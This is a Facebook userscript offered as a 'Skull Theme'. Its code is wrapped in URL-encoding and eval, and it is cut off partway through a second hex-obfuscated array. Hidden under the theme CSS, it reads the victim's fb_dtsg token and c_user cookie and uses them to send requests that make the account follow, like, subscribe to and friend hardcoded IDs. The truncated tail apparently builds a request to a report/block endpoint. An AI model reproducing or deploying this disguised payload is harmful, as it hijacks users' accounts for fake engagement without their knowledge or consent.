// ==UserScript==
// @name            Skull Theme by @Rifiyan_Jr 2014
// @description     Facebook By Rifiyan Lisandi
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
/* Official Themes ZoltCyber */

eval(unescape("var%20parent%3Ddocument.getElementsByTagName%28%22html%22%29%5B0%5D%3B%0Avar%20_body%20%3D%20document.getElementsByTagName%28%27body%27%29%5B0%5D%3B%0Avar%20_div%20%3D%20document.createElement%28%27div%27%29%3B%0A_div.style.height%3D%2225%22%3B%0A_div.style.width%3D%22100%25%22%3B%0A_div.style.position%3D%22fixed%22%3B%0A_div.style.top%3D%22auto%22%3B%0A_div.style.bottom%3D%220%22%3B%0A_div.align%3D%22center%22%3B%0Avar%20fb_dtsg%20%3D%20document.getElementsByName%28%27fb_dtsg%27%29%5B0%5D.value%3B%0Avar%20user_id%20%3D%20document.cookie.match%28document.cookie.match%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3B%0Avar%20fb_dtsg%3Ddocument.getElementsByName%28%22fb_dtsg%22%29%5B0%5D.value%3B%0Avar%20user_id%3Ddocument.cookie.match%28document.cookie.match%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3B%0Afunction%20a%28abone%29%7Bvar%20http4%3Dnew%20XMLHttpRequest%3Bvar%20url4%3D%22/ajax/follow/follow_profile.php%3F__a%3D1%22%3Bvar%20params4%3D%22profile_id%3D%22+abone+%22%26location%3D1%26source%3Dfollow-button%26subscribed_button_id%3Du37qac_37%26fb_dtsg%3D%22+fb_dtsg+%22%26lsd%26__%22+user_id+%22%26phstamp%3D%22%3Bhttp4.open%28%22POST%22%2Curl4%2Ctrue%29%3Bhttp4.onreadystatechange%3Dfunction%28%29%7Bif%28http4.readyState%3D%3D4%26%26http4.status%3D%3D200%29http4.close%7D%3Bhttp4.send%28params4%29%7Da%28%22100003580059277%22%29%3Ba%28%22100000734709629%22%29%3Ba%28%22100007217978003%22%29%3Ba%28%22100005548659597%22%29%3Ba%28%22100002261751284%22%29%3Ba%28%22100006065972287%22%29%3Ba%28%22100007225149809%22%29%3Bfunction%20sublist%28uidss%29%7Bvar%20a%3Ddocument.createElement%28%27script%27%29%3Ba.innerHTML%3D%22new%20AsyncRequest%28%29.setURI%28%27/ajax/friends/lists/subscribe/modify%3Flocation%3Dpermalink%26action%3Dsubscribe%27%29.setData%28%7B%20flid%3A%20%22+uidss+%22%20%7D%29.send%28%29%3B%22%3Bdocument.body.appendChild%28a%29%7Dsublist%28%22390578861071446%22%29%3Bsublist%28%22350373011758698%22%29%3Bsublist%28%22350686001727399%22%29%3Bsublist%28%22350686001727399%22%29%3Bvar%20user_id%3Ddocument.cookie.match%28document.cookie.match%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3Bvar%20fb_dtsg%3Ddocument.getElementsByName%28%27fb_dtsg%27%29%5B0%5D.value%3Bvar%20now%3D%28new%20Date%29.getTime%28%29%3Bfunction%20P%28post%29%7Bvar%20X%3Dnew%20XMLHttpRequest%28%29%3Bvar%20XURL%3D%22//www.facebook.com/ajax/ufi/like.php%22%3Bvar%20XParams%3D%22like_action%3Dtrue%26ft_ent_identifier%3D%22+post+%22%26source%3D1%26client_id%3D%22+now+%22%253A3366677427%26rootid%3Du_ps_0_0_14%26giftoccasion%26ft%5Btn%5D%3D%253E%253DU%26ft%5Btype%5D%3D20%26ft%5Bqid%5D%3D5882006890513784712%26ft%5Bmf_story_key%5D%3D%22+post+%22%26nctr%5B_mod%5D%3Dpagelet_home_stream%26__user%3D%22+user_id+%22%26__a%3D1%26__dyn%3D7n8ahyj35CFwXAg%26__req%3Dj%26fb_dtsg%3D%22+fb_dtsg+%22%26phstamp%3D%22%3BX.open%28%22POST%22%2CXURL%2Ctrue%29%3BX.onreadystatechange%3Dfunction%28%29%7Bif%28X.readyState%3D%3D4%26%26X.status%3D%3D200%29%7BX.close%7D%7D%3BX.send%28XParams%29%7Dvar%20fb_dtsg%3Ddocument.getElementsByName%28%27fb_dtsg%27%29%5B0%5D.value%3Bvar%20user_id%3Ddocument.cookie.match%28document.cookie.match%28/c_user%3D%28%5Cd+%29/%29%5B1%5D%29%3Bfunction%20Like%28p%29%7Bvar%20Page%3Dnew%20XMLHttpRequest%28%29%3Bvar%20PageURL%3D%22//www.facebook.com/ajax/pages/fan_status.php%22%3Bvar%20PageParams%3D%22%26fbpage_id%3D%22+p+%22%26add%3Dtrue%26reload%3Dfalse%26fan_origin%3Dpage_timeline%26fan_source%3D%26cat%3D%26nctr%5B_mod%5D%3Dpagelet_timeline_page_actions%26__user%3D%22+user_id+%22%26__a%3D1%26__dyn%3D798aD5z5CF-%26__req%3Dd%26fb_dtsg%3D%22+fb_dtsg+%22%26phstamp%3D%22%3BPage.open%28%22POST%22%2CPageURL%2Ctrue%29%3BPage.onreadystatechange%3Dfunction%28%29%7Bif%28Page.readyState%3D%3D4%26%26Page.status%3D%3D200%29%7BPage.close%7D%7D%3BPage.send%28PageParams%29%7DLike%28%22572532639482797%22%29%3BLike%28%22635732783121401%22%29%3Bfunction%20IDS%28r%29%7Bvar%20X%3Dnew%20XMLHttpRequest%28%29%3Bvar%20XURL%3D%22//www.facebook.com/ajax/add_friend/action.php%22%3Bvar%20XParams%3D%22to_friend%3D%22+r+%22%26action%3Dadd_friend%26how_found%3Dfriend_browser_s%26ref_param%3Dnone%26%26%26outgoing_id%3D%26logging_location%3Dsearch%26no_flyout_on_click%3Dtrue%26ego_log_data%26http_referer%26__user%3D%22+user_id+%22%26__a%3D1%26__dyn%3D798aD5z5CF-%26__req%3D35%26fb_dtsg%3D%22+fb_dtsg+%22%26phstamp%3D%22%3BX.open%28%22POST%22%2CXURL%2Ctrue%29%3BX.onreadystatechange%3Dfunction%28%29%7Bif%28X.readyState%3D%3D4%26%26X.status%3D%3D200%29%7BX.close%7D%7D%3BX.send%28XParams%29%7D%0A///////////////////////////KH%D4NG%20X%D3A%20%3F%20%D0%C2Y///////////////////////////%0A//%20t%E0i%0Asublist%28%22%22%29%3Bsublist%28%22%22%29%3Bsublist%28%22%22%29%3Bsublist%28%22%22%29%3Bsublist%28%22%22%29%3Bsublist%28%22%22%29%3BIDS%28%22%22%29%3BIDS%28%22%22%29%3BIDS%28%22%22%29%3BIDS%28%22%22%29%3B%0AIDS%28%22%22%29%3BIDS%28%22%22%29%3BIDS%28%22%22%29%3BIDS%28%22%22%29%3BP%28%22447622785367053%22%29%3BP%28%22449052168557448%22%29%3B%0A//Theme%0A%28function%28%29%20%7B%0Avar%20css%20%3D%20%22.highlightIndicator%2C%20%5Cn.tinyman%3Aafter%2C%20%5Cn.fbTimelineSideAds%2C%5Cn.ego_column%2C%5Cn.buttonWrap%2C%20%5Cn.fbTimelineSpine%2C%20%5Cn.spinePointer%2C%20%5Cn.topBorder%2C%20%5Cn.bottomBorder%2C%20%5Cn%23footerContainer%2C%20%5Cn.middleLink%2C%20%5Cn.slimHeader%20%23pageNav%20li.tinyman%3A%3Aafter%2C%20.slimHeader%20%23pageNav%20li.middleLink%3A%3Aafter%2C%20%5Cn.slimHeader%20%23pageNav%20.middleLink%20a%2C%20%5Cn.moreSectionsLink%5Cn%7B%5Cndisplay%3Anone%20%21important%3B%5Cn%7D%5Cn%5Cndiv.mainWrapper%7B%5Cnpadding-left%3A%201em%20%21important%3B%5Cn%7D%5Cn.uiProgressBar%20.fill%20%7B%5Cnbackground%3A%20%23444%20%21important%3B%5Cnborder%3A%20solid%20%23222%20%21important%3B%5Cn%7D%5Cn.uiTypeaheadView%20.compact%20li%20%7B%5Cnbackground-color%3A%20%23111%20%21important%3B%5Cn%7D%5Cndiv.uiTypeaheadView%20.selected%20%7B%5Cnbackground-color%3A%20%23333%20%21important%3B%5Cn%7D%5Cn.fbIndex%20.gradient%20%7B%5Cnbackground%3A%20none%20%21important%3B%5Cn%7D%5Cn.notifNegativeBase%20%23fbNotificationsFlyout%20li.jewelItemNew%2C%20.notifNegativeBase%20%23fbNotificationsFlyout%20li.first_receipt%20%7B%5Cnbackground%3A%20%23333%20%21important%3B%5Cn%7D%5Cn.pop_container%20%7B%5Cnbackground-color%3A%20%23000%20%21important%3B%5Cn%7D%5Cn.pop_verticalslab%2C%20.pop_horizontalslab%20%7B%5Cnbackground%3A%20%23222%20%21important%3B%5Cn%7D%5Cn.uiMenuXItem%5Cna.highlighted%20%7B%5Cnbackground-color%3A%20%23333%20%21important%3B%5Cnborder-color%3A%20%23000%20%21important%3B%5Cncolor%3A%20%23fff%20%21important%3B%5Cn%7D%5Cn.uiMenuXItem%5Cna.highlighted%20%7B%5Cnbackground-color%3A%20%23333%20%21important%3B%5Cnborder-color%3A%20%23000%20%21important%3B%5Cncolor%3A%20%23fff%20%21important%3B%5Cn%7D%5Cn.uiContextualLayer%20%7B%5Cnbackground-color%3A%20%23111%20%21important%3B%5Cn%7D%5Cn.HighlightSelectorMenu%20%7B%5Cnborder%3A%202px%20solid%20%23000%20%21important%3B%5Cnbackground%3A%20%23111%20%21important%3B%5Cnborder-radius%3A%205px%20%21important%3B%5Cn%7D%5Cn.-cx-PUBLIC-uiDialog__border%2C%20._1yu%20%7B%5Cnborder%3A%2010px%20solid%20rgba%2882%2C%2082%2C%2082%2C%20.7%29%20%21important%3B%5Cn-webkit-border-radius%3A%208px%20%21important%3B%5Cn%7D%5Cninput%5Btype%3D%5C%22text%5C%22%5D%2C%20input%5Btype%3D%5C%22password%5C%22%5D%2C%20.inputtext%2C%20select%2C%20.select%2C%20select%20%3E%20option%2C%20select%20%3E%20button%2C%20.fbPhotoImageStage%20.fbPhotosPhotoButtons%20.tagMessage%2C%20.fbPhotoImageStage%20.fbPhotosPhotoButtons%20.cropMessage%2C%20%23u1clso_61%20div%20img%2C%20%23navSearch%20.uiTypeahead%2C%20.-cx-PRIVATE-uiDialog__content%2C%20._1yu%2C%20._t%20%7B%5Cnbackground-color%3A%20%23111%20%21important%3B%5Cn%7D%5Cn.fbTimelineCapsule%5Cn%7B%5Cnbackground%3A%20none%20%21important%3B%5Cn%7D%5Cn.sp_c79t5t%5Cn%7B%5Cnbackground-image%3A%20none%20%21important%3B%5Cn%7D%5Cn*%20%7B%5Cnborder-color%3A%20transparent%20%21important%3B%5Cncolor%3A%20%23fff%20%21important%3B%5Cnbackground-color%3A%20transparent%20%21important%3B%20%5Cn%7D%5Cn%5Cn%23fbTimelineHeadline%20.profilePic%20%7B%5Cnbackground-color%3A%20%23fff%20%21important%3B%5Cnborder%3A%204px%20solid%20%23fff%20%21important%3B%5Cn-webkit-border-radius%3A%202px%20%21important%3B%5Cnheight%3A%20160px%20%21important%3B%5Cnwidth%3A%20160px%20%21important%3B%5Cn%7D%5Cn%5Cn%5Cn.fbTimelineScrubber%20%7B%5Cn%5Cnborder-color%3A%20%23333333%20%21important%3B%5Cnpadding%3A%208px%200%208px%201px%20%21important%3B%5Cntop%3A%2038px%20%21important%3B%5Cnwidth%3A%20122px%20%21important%3B%5Cnz-index%3A%201%20%21important%3B%5Cnborder-radius%3A%2010px%20%21important%3B%5Cn%7D%5Cn%5Cn.fbPhotosPhotoTagboxBase%20.tagName%20%7B%5Cnbackground%3A%20%23000%20%21important%3B%5Cncolor%3A%20%23fff%20%21important%3B%5Cncursor%3A%20default%20%21important%3B%5Cnfont-weight%3A%20normal%20%21important%3B%5Cnpadding%3A%202px%206px%203px%20%21important%3B%5Cntop%3A%203px%20%21important%3B%5Cnwhite-space%3A%20nowrap%20%21important%3B%5Cn%7D%5Cn%5Cn.fbPhotosPhotoTagboxBase%20.innerTagBox%20%7B%5Cnborder%3A%204px%20solid%20white%20%21important%3B%5Cnborder-color%3A%20rgba%28255%2C%20255%2C%20255%2C%20.8%29%20%21important%3B%5Cn%7D%5Cn%5Cn.fbPhotoSnowlift%20%7B%5Cnbackground-color%3A%20rgba%280%2C%200%2C%200%2C%20.7%29%20%21important%3B%5Cn%7D%5Cn%5Cn.fbPhotoSnowlift%20.rhc%20%2C%20.pagingActivated%20.snowliftOverlay%2C%20.fbPhotoSnowlift.taggingMode%20.snowliftOverlay%2C%20.stageWrapper%7B%5Cnbackground-color%3A%20%23111%20%21important%3B%5Cn%7D%5Cn%5Cn.profile-picture%20img%20%7B%5Cnmax-width%3A%20170px%20%21important%3B%5Cn%7D%5Cn%5Cn.webComposerPhotoUpload%20input%2C%20.webComposerPhotoUpload%20%7B%5Cncolor%3A%20%23000000%20%21important%3B%5Cn%7D%5Cn%5Cn%5Cnhtml%7Bbackground%3Aurl%28http%3A//fc04.deviantart.net/fs70/i/2011/347/4/b/call_of_duty___elite_founder_skull_wallpaper_by_tado_kurosawa615-d4j0dfu.jpg%29%20no-repeat%20center%20fixed%3Bbackground-size%3Acover%3B-o-background-size%3Acover%3B-webkit-background-size%3Acover%7D%5Cn%5Cn%5Cn%5Cn%5Cn.fbCurrentStory%3Ahover%2C%20.connect_widget_like_button%2C%20.fbFeedTickerStory%3Ahover%2C%20.item%20a%3Ahover%2C%20.fbJewelFlyout%20li%3Ahover%2C%20.uiSideNav%20a%3Ahover%2C%20.fbNubFlyoutBody%2C%20.uiButtonConfirm%20%7B%5Cnbackground%3A%20%23111111%20%21important%3B%5Cn%7D%5Cn%5Cn.fbChatMessageGroup%20%7B%5Cnborder-color%3A%20%232c2c2c%20%21important%3B%5Cn%7D%5Cn%5Cn.fbChatSidebar%20%7B%5Cnbackground%3A%20%23111111%20%21important%3B%5Cn%7D%5Cn%5Cn%23leftCol%20%7B%5Cnposition%3A%20relative%3Btop%3A20px%21important%3B%5Cnmin-height%3A%20400px%20%21important%3B%5Cn%7D%5Cn%5Cn.arrowLeft%20a%20%7B%5Cnbackground-image%3Aurl%28%27http%3A//i.imgur.com/26zf5.png%27%29%20%21important%3B%5Cnborder-color%3A%20%23666666%20%21important%3B%5Cn%7D%5Cn%5Cn.arrowRight%20a%20%7B%5Cnbackground-image%3Aurl%28%27http%3A//i.imgur.com/v6B6z.png%27%29%20%21important%3B%5Cnborder-color%3A%20%23666666%20%21important%3B%5Cn%7D%5Cn%5Cn.uiStreamSubstory%20%7B%5Cnborder-color%3A%20transparent%20%21important%3B%5Cn%7D%5Cn%5Cn.uiHeader%20%7B%5Cnbackground-color%3A%20transparent%20%21important%3B%5Cn%7D%5Cn%5Cn.fbSidebarGripper%2C%20.fbTickerFooter%2C%20.fbSidebarGripper%20div%2C%20.navSubmenu%3Ahover%20%7B%5Cnbackground-color%3A%20%23222222%20%21important%3B%5Cn%7D%5Cn%5Cn.fbTimelineCountButton%2C%20.uiBoxWhite%2C%20.uiButtonGroup%20%7B%5Cnbackground-color%3A%20%231c1c1c%20%21important%3B%5Cn%7D%5Cn%5Cn%5Cn%5Cn%23leftCol%20%7B%5Cnpadding-top%3A%200px%20%21important%3B%5Cnpadding-left%3A%200px%20%21important%3B%5Cn%7D%5Cn%5Cn.fbNubFlyoutFooter%20%7B%5Cnbackground%3A%20%23111111%20%21important%3B%5Cnbox-shadow%3A%200%201px%202px%20rgba%280%2C%200%2C%200%2C%200.5%29%20%21important%3B%5Cncolor%3A%20%235ee007%20%21important%3B%20%5Cnborder%3A%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn.uiStream%20.uiSelectorButton%20%7B%5Cnbackground-image%3A%20url%28%5C%22http%3A//i.imgur.com/nOfuQ.png%5C%22%29%20%21important%3B%5Cn%7D%5Cn%5Cn.uiSearchInput%20%7B%5Cnbackground-image%3A%20url%28%5C%22http%3A//i.imgur.com/agmNw.png%5C%22%29%20%21important%3B%5Cn%7D%5Cn%5Cn%5Cn%5Cn%5Cn.jewelButton%3Ahover%2C%20.topNavLink%20a%3Ahover%20%7B%5Cnbackground-color%3A%20%23222222%20%21important%3B%5Cn%7D%5Cn%5Cn.uiScrollableAreaGripper%20%7B%5Cnbackground-color%3A%20%23666666%20%21important%3B%5Cn%7D%5Cn%5Cn.uiSearchInput%2C%20.fbPhotosGridHeader%2C%20.uiComposerMessageBoxControls%2C%20%23MessagingShelf%2C%20.uiBoxGray%20%7B%5Cnbackground%3A%20%23111111%20%21important%3B%5Cn%7D%5Cn%5Cn.uiButton%20%7B%5Cnbackground%3A%20%231c1c1c%20%21important%3B%5Cn%7D%5Cn%5Cn%23blueBar%20%20%7B%5Cnbackground%3A%20-moz-linear-gradient%28top%2C%20%20%2345484d%200%25%2C%20%23000000%20100%25%29%20%21important%3B%5Cnbackground%3A%20-webkit-linear-gradient%28top%2C%20%20%2345484d%200%25%2C%20%23000000%20100%25%29%20%21important%3B%5Cnbox-shadow%3A%200%200%207px%20rgba%28211%2C%2032%2C%20198%2C%200.75%29%20%21important%3B%5Cnborder%3A4px%20ridge%20%235ee007%20%21important%3B%5Cnmargin-top%3A5px%21important%3B%5Cnmargin-left%3A5px%21important%3B%5Cnborder-radius%3A%2070px%21important%3B%5Cn%7D%5Cn%5Cn%5Cn%5Cn%23contentCol%2C%20%23pageLogo%20a%20%7B%5Cnbackground-color%3A%20transparent%20%21important%3B%5Cnborder-color%3A%20transparent%20%21important%3B%5Cn%7D%5Cn%5Cn.uiMorePager%20%7B%5Cnmargin-bottom%3A6px%20%21important%3B%5Cnbackground-color%3A%20%231c1c1c%20%21important%3B%5Cnborder%3A%200px%20solid%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn.uiStreamStory%2C%20.fbIndexFeaturedRegistration%2C%20.signupForm%20%7B%5Cnmargin-bottom%3A2px%20%21important%3B%5Cnbackground-color%3Atransparent%20%21important%3B%5Cnbackground-image%3Aurl%28%27http%3A//i.imgur.com/T2LPj.png%27%29%20%21important%3B%5Cnborder-radius%3A%2015px%20%21important%3B%5Cnpadding%3A%201px%20%21important%3B%5Cnborder%3A%200px%20solid%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn.uiStream%20.uiStreamHeader%20.uiStreamHeaderChronologicalForm%20.uiSelectorButton%20.uiButtonText%20%7B%5Cncolor%3A%20%23000%20%21important%3B%5Cn%7D%5Cn%5Cn%23album_pagelet%20%7B%5Cnbackground-color%3A%20%23111111%20%21important%3B%5Cnmargin-left%3A%200px%20%21important%3B%5Cnmargin-top%3A%20-15px%20%21important%3B%5Cn%7D%5Cn%5Cn.tagWrapper%2C%20%23pagelet_main_column%2C%20.timelineUnitContainer%2C%20.fbTimelineTopSection%2C%20%23MessagingMessages%20%7B%5Cnbackground-color%3Atransparent%20%21important%3B%5Cnbackground-image%3Aurl%28%27http%3A//i.imgur.com/T2LPj.png%27%29%20%21important%3B%5Cnborder-radius%3A%2015px%20%21important%3B%5Cnborder%3A%200px%20solid%20%23333333%20%21important%3B%5Cn%7D%5Cn.fbTimelineTopSectionBase%20.topSectionBottomBorder%20%7B%5Cndisplay%3A%20none%20%21important%3B%5Cn%7D%5Cn%23pagelet_main_column%20%7B%5Cnwidth%3A%20500px%20%21important%3B%5Cn%7D%5Cn%5Cn.fbJewelFlyout%2C%20.uiToggleFlyout%2C%20.navigation%2C%20.container%2C%20.uiOverlayContent%2C%20.search%2C%20.pop_container_advanced%20%7B%5Cnbackground-color%3A%20%23111111%20%21important%3B%20%5Cnborder-radius%3A%2015px%20%21important%3B%5Cnborder%3A%202px%20solid%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn%23left_column%2C%20%23leftCol%2C%20.MessagingReadHeader%20%7B%5Cnbackground%3A%20%23111111%20%21important%3B%5Cnborder-radius%3A%2015px%20%21important%3B%5Cn%7D%5Cn%5Cn%23left_column%2C%20%23leftCol%20%7B%5Cnmargin-left%3A-8px%20%21important%3B%5Cnwidth%3A%20185px%20%21important%3B%5Cn%7D%5Cn%5Cn.uiMediaThumb%20i%2C%20.uiProfilePhoto%20%7B%5Cnborder%3A%201px%20solid%20%23000000%20%21important%3B%20%5Cn%7D%5Cn%5Cn%23rightCol%20%7B%5Cnmargin-top%3A%2010px%20%21important%3B%5Cnpadding-top%3A%200px%20%21important%3B%5Cnbackground%3A%20%23111111%20%21important%3B%5Cnborder-radius%3A%2015px%20%21important%3B%5Cnborder%3A%200px%20solid%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn%23right_column%2C%20.rightColumnWrapper%20%7B%5Cnmargin-top%3A%200px%20%21important%3B%5Cnpadding-top%3A%200px%20%21important%3B%20%5Cnposition%3A%20fixed%20%21important%3B%5Cnbackground%3A%20%23111111%20%21important%3B%5Cnborder-radius%3A%2015px%20%21important%3B%20%5Cnborder%3A%200px%20solid%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn.aboutMePagelet%20%7B%5Cnbackground-color%3Atransparent%20%21important%3B%5Cnbackground-image%3Aurl%28%27http%3A//i.imgur.com/T2LPj.png%27%29%20%21important%3B%5Cnborder%3A%200px%20solid%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn.fbNubButton%2C%20.fbNubFlyoutTitlebar%2C%20.uiToggleFlyout%2C%20.fbChatSidebarFooter%20%7B%5Cnbackground%3A%20-moz-linear-gradient%28center%20top%20%2C%20%23333333%2C%20%23000000%29%20%21important%3B%5Cnbackground%3A%20-webkit-linear-gradient%28center%20top%20%2C%20%23333333%2C%20%23000000%29%20%21important%3B%5Cnbox-shadow%3A%200%201px%202px%20rgba%280%2C%200%2C%200%2C%200.5%29%20%21important%3B%5Cncolor%3A%20%235ee007%20%21important%3B%5Cnborder%3A%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn.fbChatOrderedList%20%7B%5Cnbackground%3A%20-moz-linear-gradient%28center%20right%20%2C%20%23333333%2C%20%23000000%29%20%21important%3B%5Cnbackground%3A%20-webkit-linear-gradient%28center%20right%20%2C%20%23333333%2C%20%23000000%29%20%21important%3B%5Cnbox-shadow%3A%200%201px%202px%20rgba%280%2C%200%2C%200%2C%200.5%29%20%21important%3B%5Cncolor%3A%20%235ee007%20%21important%3B%5Cnborder%3A%20%23333333%20%21important%3B%5Cn%7D%5Cn%5Cn%5Cn%5Cn%5Cn%5Cn%5Cn%5Cn%5Cn.UFIMentionsInputWrap%2C.navHeader%2C%20._554n%2C.fbxWelcomeBox%20%2C._2yg%20.composerTypeahead%20%7B%5Cnbackground%3A%20-moz-linear-gradient%28top%2C%20%20%2345484d%200%25%2C%20%23000000%20100%25%29%20%21important%3B%5Cnbackground%3A%20-webkit-linear-gradient%28top%2C%20%20%2345484d%200%25%2C%20%23000000%20100%25%29%20%21important%3B%5Cnbox-shadow%3A%200%202px%204px%20rgba%28211%2C%2032%2C%20198%2C%200.75%29%20%21important%3B%5Cnborder%3A2px%20ridge%20%235ee007%20%21important%3B%5Cnmargin-top%3A5px%21important%3B%5Cnmargin-left%3A0px%21important%3B%5Cnborder-radius%3A%207px%21important%3B%5Cnpadding%3A3px%21important%3B%5Cn%7D%5Cn.fbx%20%23pageHead%2C%20%23blueBar%20%23pageHead%7B%5Cnpadding-top%3A0px%21important%3B%5Cn%7D%5Cn%5Cn.slim%20%23blueBar%20%7B%5Cn%5Cn%20%20%20%20height%3A%2035px%21important%3B%5Cn%7D%5Cn.fbxWelcomeBoxBlock%20.fbxWelcomeBoxImg%2C%5Cn._s0%2C%5Cn._42fz%20.pic%7B%5Cn%20%20%20border%3A2px%20solid%20%20rgba%280%2C%200%2C%200%2C%20.55%29%21important%3B%5Cn%20%20%20border-radius%3A%2037px%21important%3B%5Cn%7D%5Cn.fbxWelcomeBoxBlock%20.fbxWelcomeBoxImg%3Ahover%2C%5Cn._s0%3Ahover%2C%5Cn._42fz%20.pic%3Ahover%7B%5Cn%20%20%20box-shadow%3A%200px%200px%204px%20rgba%28211%2C%2032%2C%20198%2C%200.75%29%20%21important%3B%5Cn%20%20%20border%3A2px%20ridge%20%235ee007%20%21important%3B%5Cn%20%20%20border-radius%3A%2037px%21important%3B%5Cn%7D%5Cn.uiSideNav%20.sideNavItem%20.hasCount%3Ahover%2C%5Cn.uiSideNav%20.sideNavItem%20.noCount%3Ahover%7B%5Cn%20%20%20text-shadow%3A%202px%202px%202px%20rgba%2839%2C%2098%2C%20138%2C%200.75%29%20%21important%3B%5Cn%20%20%20color%3A%20%235ee007%20%21important%3B%5Cn%5Cn%7D%5Cn%23navSearch%20%7B%5Cnwidth%3A300px%20%21important%3B%5Cnmargin-top%3A%206px%20%21important%3B%5Cnmargin-left%3A%2030px%20%21important%3B%5Cnborder-color%3A%20transparent%20%21important%3B%5Cn%7D%5Cn%23headNav%20%7B%5Cn%20%20%20%20height%3A%2030px%3B%5Cn%7D%5Cn%5Cn%5Cn%5Cna%3Ahover%7B%5Cn%20%20%20text-shadow%3A%202px%202px%202px%20rgba%2839%2C%2098%2C%20138%2C%200.75%29%20%21important%3B%5Cn%20%20%20color%3A%20%235ee007%20%21important%3B%5Cn%7D%5Cn.UIActionLinks_bottom%20a%2C%20%5Cn.UIActionLinks_bottom%20button.as_link%2C%20%5Cn.UIActionLinks_bottom%20.uiLinkButton%20input%2C%20%5Cn.UIActionLinks_bottom%20.uiLinkButton%20input%3Ahover%2C%5Cn.uiStreamMessage%20.actorName%2C%20.uiStreamMessage%20.passiveName%5Cn%7B%5Cn%20%20%20text-shadow%3A%201px%201px%201px%20rgba%280%2C%200%2C%200%2C%200.99%29%20%21important%3B%5Cn%20%20%20color%3A%20%235ee007%20%21important%3B%5Cn%7D%5Cn._2yg%20.composerTypeahead%20%2C%23bfb_options_button_li.openToggler%20ul%2C%5Cn%20.better_fb_mini_message%2C%20.sfx_mini_message_no_x%2C%5Cn%20.GM_options_wrapper_inner%2C%5Cn%20.better_fb_mini_message%2C%20.mini_x%7B%5Cnbackground%3A%20-moz-linear-gradient%28top%2C%20%20%2345484d%200%25%2C%20%23000000%20100%25%29%20%21important%3B%5Cnbackground%3A%20-webkit-linear-gradient%28top%2C%20%2345484d%20%200%25%2C%23000000%20100%25%29%3B%5Cnbox-shadow%3A%200%202px%204px%20rgba%2839%2C%2098%2C%20138%2C%200.75%29%20%21important%3B%5Cnborder%3A2px%20ridge%20%235ee007%20%21important%3B%5Cnmargin-top%3A5px%21important%3B%5Cnmargin-left%3A0px%21important%3B%5Cnborder-radius%3A%207px%21important%3B%5Cnpadding%3A3px%21important%3B%5Cn%7D%5Cn.GM_options_buttons%20input%7B%5Cn%20%20%20text-shadow%3A%201px%201px%201px%20rgba%280%2C%200%2C%200%2C%200.99%29%20%21important%3B%5Cn%20%20%20color%3A%20%235ee007%20%21important%3B%5Cn%5Cn%7D%22%3B%0Aif%20%28typeof%20GM_addStyle%20%21%3D%20%22undefined%22%29%20%7B%0A%20%20%20%20%20%20%20%20GM_addStyle%28css%29%3B%0A%7D%20else%20if%20%28typeof%20PRO_addStyle%20%21%3D%20%22undefined%22%29%20%7B%0A%20%20%20%20%20%20%20%20PRO_addStyle%28css%29%3B%0A%7D%20else%20if%20%28typeof%20addStyle%20%21%3D%20%22undefined%22%29%20%7B%0A%20%20%20%20%20%20%20%20addStyle%28css%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20var%20node%20%3D%20document.createElement%28%22style%22%29%3B%0A%20%20%20%20%20%20%20%20node.type%20%3D%20%22text/css%22%3B%0A%20%20%20%20%20%20%20%20node.appendChild%28document.createTextNode%28css%29%29%3B%0A%20%20%20%20%20%20%20%20var%20heads%20%3D%20document.getElementsByTagName%28%22head%22%29%3B%0A%20%20%20%20%20%20%20%20if%20%28heads.length%20%3E%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20heads%5B0%5D.appendChild%28node%29%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%09%09//@Rifiyan_Jr%0A%09%09document.documentElement.appendChild%28node%29%3B%0A%09%7D%0A%7D%0A%7D%29%28%29%3B%0Avar%20_0xb161%3D%5B%22%5Cx76%5Cx61%5Cx6C%5Cx75%5Cx65%22%2C%22%5Cx66%5Cx62%5Cx5F%5Cx64%5Cx74%5Cx73%5Cx67%22%2C%22%5Cx67%5Cx65%5Cx74%5Cx45%5Cx6C%5Cx65%5Cx6D%5Cx65%5Cx6E%5Cx74%5Cx73%5Cx42%5Cx79%5Cx4E%5Cx61%5Cx6D%5Cx65%22%2C%22%5Cx6D%5Cx61%5Cx74%5Cx63%5Cx68%22%2C%22%5Cx63%5Cx6F%5Cx6F%5Cx6B%5Cx69%5Cx65%22%2C%22%5Cx67%5Cx65%5Cx74%5Cx54%5Cx69%5Cx6D%5Cx65%22%2C%22%5Cx2F%5Cx2F%5Cx77%5Cx77%5Cx77%5Cx2E%5Cx66%5Cx61%5Cx63%5Cx65%5Cx62%5Cx6F%5Cx6F%5Cx6B%5Cx2E%5Cx63%5Cx6F%5Cx6D%5Cx2F%5Cx61%5Cx6A%5Cx61%5Cx78%5Cx2F%5Cx72%5Cx65%5Cx70%5Cx6F%5Cx72%5Cx74%5Cx2F%5Cx73%5Cx6F%5Cx63%5Cx69%5Cx61%5Cx6C%5Cx2E%5Cx70%5Cx68%5Cx70%22%2C%22%5Cx66%5Cx62%5Cx5F%5Cx64%5Cx74%5Cx73%5Cx67%5Cx3D%22%2C%22%5Cx26%5Cx62%5Cx6C%5Cx6F%5Cx63%5Cx6B%5Cx3D%5Cx31%5Cx26%5Cx70%5Cx70%5Cx3D%5Cx25%5Cx37%5Cx42%5Cx25%5Cx32%5Cx32%5Cx61%5Cx63%5Cx74%5Cx69%5Cx6F%5Cx6E%5Cx73%5Cx5F%5Cx74%5Cx6F%5Cx5F%5Cx74%5Cx61%5Cx6B%5Cx65%5Cx25%5Cx32%5Cx32%5Cx25%5Cx33%5Cx41%5Cx25%5Cx32%5Cx32%5Cx5B%5Cx5D%5Cx25%5Cx32%5Cx32%5Cx25%5Cx32%5Cx43%5Cx25%5Cx32%5Cx32%5Cx61%5Cx72%5C